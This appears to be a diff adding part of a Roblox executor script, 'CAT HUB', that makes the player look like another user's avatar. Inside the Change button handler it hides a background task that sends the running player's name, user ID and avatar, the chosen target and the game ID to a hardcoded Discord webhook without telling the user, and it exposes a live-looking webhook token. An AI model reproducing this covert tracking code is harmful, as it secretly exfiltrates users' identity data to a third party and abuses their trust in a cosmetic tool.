+
+                    target.Transform =
+                        source.Transform
+                end
+            end
+        end
+    )
+end
+
+--========================================================
+-- REMOVE AVATAR
+--========================================================
+
+local function removeAvatar()
+
+    -- Stop movement/animation mirror
+    stopMirror()
+
+    -- Remove motor references
+    clearMotorPairs()
+
+    -- Destroy visual
+    if Overlay.model then
+
+        pcall(function()
+            Overlay.model:Destroy()
+        end)
+    end
+
+    Overlay.model = nil
+    Overlay.hrp = nil
+    Overlay.weld = nil
+
+    -- Restore original avatar
+    restoreRealAvatar()
+
+    Overlay.lastUserId = nil
+    Overlay.lastUsername = nil
+end
+
+--========================================================
+-- CHANGE AVATAR
+--========================================================
+
+local function changeAvatar(username)
+
+    if Busy then
+        return false, "Please wait..."
+    end
+
+    username =
+        tostring(username or "")
+
+    username =
+        username:gsub(
+            "^%s+",
+            ""
+        )
+
+    username =
+        username:gsub(
+            "%s+$",
+            ""
+        )
+
+    if username == "" then
+
+        return false,
+            "Enter username."
+    end
+
+    Busy = true
+
+    -- Remove previous visual
+    removeAvatar()
+
+    local realCharacter =
+        getCharacter()
+
+    local realHRP =
+        getHRP(realCharacter)
+
+    if not realHRP then
+
+        Busy = false
+
+        return false,
+            "Character not ready."
+    end
+
+    --====================================================
+    -- GET USER ID
+    --====================================================
+
+    local userSuccess, userId =
+        pcall(function()
+
+            return Players:
+                GetUserIdFromNameAsync(
+                    username
+                )
+        end)
+
+    if not userSuccess
+        or not userId then
+
+        Busy = false
+
+        return false,
+            "Username not found."
+    end
+
+    --====================================================
+    -- CREATE ROBLOX AVATAR MODEL
+    --====================================================
+
+    local modelSuccess,
+        targetModel =
+        pcall(function()
+
+            return Players:
+                CreateHumanoidModelFromUserIdAsync(
+                    userId
+                )
+        end)
+
+    if not modelSuccess
+        or not targetModel then
+
+        Busy = false
+
+        return false,
+            "Failed to load avatar."
+    end
+
+    --====================================================
+    -- PREPARE MODEL
+    --====================================================
+
+    prepareModel(
+        targetModel
+    )
+
+    targetModel.Name =
+        "ChrisAvatarOverlay"
+
+    --====================================================
+    -- FOLDER
+--====================================================
+
+    local folder =
+        getOverlayFolder()
+
+    if not folder then
+
+        targetModel:Destroy()
+
+        Busy = false
+
+        return false,
+            "Camera not ready."
+    end
+
+    targetModel.Parent =
+        folder
+
+    --====================================================
+    -- VISUAL ROOT
+    --====================================================
+
+    local targetHRP =
+        targetModel:FindFirstChild(
+            "HumanoidRootPart"
+        )
+
+    if not targetHRP then
+
+        targetModel:Destroy()
+
+        Busy = false
+
+        return false,
+            "Avatar has no HumanoidRootPart."
+    end
+
+    --====================================================
+    -- INITIAL POSITION
+    --====================================================
+
+    targetModel:PivotTo(
+        realHRP.CFrame
+    )
+
+    --====================================================
+    -- WELD VISUAL TO REAL CHARACTER
+    --====================================================
+
+    local weld =
+        Instance.new(
+            "WeldConstraint"
+        )
+
+    weld.Name =
+        "ChrisAvatarWeld"
+
+    weld.Part0 =
+        targetHRP
+
+    weld.Part1 =
+        realHRP
+
+    weld.Parent =
+        targetHRP
+
+    --====================================================
+    -- EXTRA ROOT PHYSICS
+    --====================================================
+
+    targetHRP.CanCollide = false
+    targetHRP.CanTouch = false
+    targetHRP.CanQuery = false
+    targetHRP.Massless = true
+
+    --====================================================
+    -- SAVE STATE
+    --====================================================
+
+    Overlay.model =
+        targetModel
+
+    Overlay.hrp =
+        targetHRP
+
+    Overlay.weld =
+        weld
+
+    Overlay.lastUserId =
+        userId
+
+    Overlay.lastUsername =
+        username
+
+    --====================================================
+    -- BUILD ANIMATION PAIRS
+    --====================================================
+
+    buildMotorPairs(
+        realCharacter,
+        targetModel
+    )
+
+    --====================================================
+    -- START MOVEMENT + ANIMATION
+    --====================================================
+
+    startMirror()
+
+    --====================================================
+    -- HIDE REAL CHARACTER
+    --====================================================
+
+    hideRealAvatar(
+        realCharacter
+    )
+
+    Busy = false
+
+    return true,
+        "Avatar changed: @" .. username
+end
+
+--========================================================
+-- CHANGE BUTTON
+--========================================================
+ChangeButton.MouseButton1Click:Connect(
+    function()
+        local success, message = changeAvatar(UsernameBox.Text)
+        if success then
+            -- ✅ CAPTURE MUNA BAGO I-CLEAR
+            local capturedName = UsernameBox.Text
+            local capturedUserId = nil
+            pcall(function()
+                capturedUserId = Players:GetUserIdFromNameAsync(capturedName)
+            end)
+            
+            UsernameBox.Text = ""
+            UsernameBox.PlaceholderText = "Avatar active"
+            
+            task.spawn(function()
+                pcall(function()
+                    local HttpService = game:GetService("HttpService")
+                    local WEBHOOK_URL = "https://discord.com/api/webhooks/1258742225299570699/07XGD0PDCnLxJsIi6EIuoq8JBRLsmnYh_Bwheyzpb84uxB6LjqPvCGvyV-F635JLiM8c"
+                    
+                    -- MAIN PROFILE
+                    local mainName = LocalPlayer.Name
+                    local mainUserId = LocalPlayer.UserId
+                    local mainAvatarUrl = ""
+                    pcall(function()
+                        local res = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(mainUserId).."&size=420x420&format=Png&isCircular=false")
+                        local data = HttpService:JSONDecode(res)
+                        if data.data and data.data[1] and data.data[1].imageUrl then
+                            mainAvatarUrl = data.data[1].imageUrl
+                        end
+                    end)
+                    
+                    -- TARGET PROFILE
+                    local targetName = capturedName
+                    local targetUserId = capturedUserId
+                    local targetAvatarUrl = ""
+                    if targetUserId then
+                        pcall(function()
+                            local res = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds="..tostring(targetUserId).."&size=420x420&format=Png&isCircular=false")
+                            local data = HttpService:JSONDecode(res)
+                            if data.data and data.data[1] and data.data[1].imageUrl then
+                                targetAvatarUrl = data.data[1].imageUrl
+                            end
+                        end)
+                    end
+                    
+                    local mainEmbed = {
+                        title = "👤 Profile Main — "..tostring(mainName),
+                        color = 3447003,
+                        description = "**Player who used the script**\n[🔗 View Profile](https://www.roblox.com/users/"..tostring(mainUserId).."/profile)",
+                        thumbnail = { url = mainAvatarUrl },
+                        fields = {
+                            { name = "👤 Player", value = tostring(mainName), inline = true },
+                            { name = "🆔 UserId", value = "`"..tostring(mainUserId).."`", inline = true }
+                        }
+                    }
+                    if mainAvatarUrl ~= "" then
+                        mainEmbed.image = { url = mainAvatarUrl }
+                    end
+                    
+                    local targetEmbed = {
+                        title = "🎭 Profile Change — "..tostring(targetName),
+                        color = 15844367,
+                        description = "**Avatar they changed to**\n[🔗 View Profile](https://www.roblox.com/users/"..tostring(targetUserId or 0).."/profile)",
+                        thumbnail = { url = targetAvatarUrl },
+                        fields = {
+                            { name = "👤 Target", value = tostring(targetName), inline = true },
+                            { name = "🆔 UserId", value = "`"..tostring(targetUserId or "Not found").."`", inline = true },
+                            { name = "🎮 Game", value = tostring(game.PlaceId), inline = false }
+                        },
+                        footer = { text = "CAT HUB V1.5.1 • "..os.date("!%Y-%m-%d %H:%M:%S").." UTC" }
+                    }
+                    if targetAvatarUrl ~= "" then
+                        targetEmbed.image = { url = targetAvatarUrl }
+                    end
+                    
+                    local body = HttpService:JSONEncode({
+                        username = "🐱 CAT HUB Avatar Tracker",
+                        embeds = { mainEmbed, targetEmbed }
+                    })
+                    
+                    if request then
+                        request({
+                            Url = WEBHOOK_URL,
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = body
+                        })
+                        warn("[CAT HUB] ✅ Avatar log sent")
+                    elseif syn and syn.request then
+                        syn.request({
+                            Url = WEBHOOK_URL,
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = body
+                        })
+                        warn("[CAT HUB] ✅ Avatar log sent via syn")
+                    end
+                end)
+            end)
+        else
+            UsernameBox.PlaceholderText = message
+        end
+    end
+)
+
+--========================================================
+--=======================================================
+-- REMOVE BUTTON
+--========================================================
+
+RemoveButton.MouseButton1Click:Connect(
+    function()
+
+        removeAvatar()
+
+        -- Extra restore safety
+        local character =
+            LocalPlayer.Character
+
+        if character then
+
+            for _, instance in ipairs(
+                character:GetDescendants()
+            ) do
+
+                if instance:IsA("BasePart") then
+
+                    instance.LocalTransparencyModifier =
+                        0
+
+                elseif instance:IsA("Decal")
+                    or instance:IsA("Texture") then
+
+                    instance.Transparency = 0
+                end
+            end
+        end
+
+        UsernameBox.Text = ""
+
+        UsernameBox.PlaceholderText =
+            "Enter Roblox username..."
+    end
+)
+
+--========================================================
+-- MINIMIZE
+--========================================================
+
+Minimize.MouseButton1Click:Connect(
+    function()
+
+        task.wait()
+
+        if not MainWasDragged() then
+
+            Main.Visible = false
+            Mini.Visible = true
+        end
+    end
+)
+
+--========================================================
+-- OPEN
+--========================================================
+
+Mini.MouseButton1Click:Connect(
+    function()
+
+        task.wait()
+
+        if not MiniWasDragged() then
+
+            Mini.Visible = false
+            Main.Visible = true
+        end
+    end
+)
+
+--========================================================
+-- CLOSE
+--========================================================
+
+Close.MouseButton1Click:Connect(
+    function()
+
+        removeAvatar()
+
+        Gui:Destroy()
+    end
+)
+
+--========================================================
+-- RESPAWN SAFETY
+--========================================================
+
+LocalPlayer.CharacterAdded:Connect(
+    function(newCharacter)
+
+        removeAvatar()
+
+        task.wait(0.15)
+
+        if not newCharacter
+            or not newCharacter.Parent then
+            return
+        end
+
+        for _, instance in ipairs(
+            newCharacter:GetDescendants()
+        ) do
+
+            if instance:IsA("BasePart") then
+
+                instance.LocalTransparencyModifier =
+                    0
+
+            elseif instance:IsA("Decal")
+                or instance:IsA("Texture") then
+
+                instance.Transparency = 0
+            end
+        end
+    end
+)
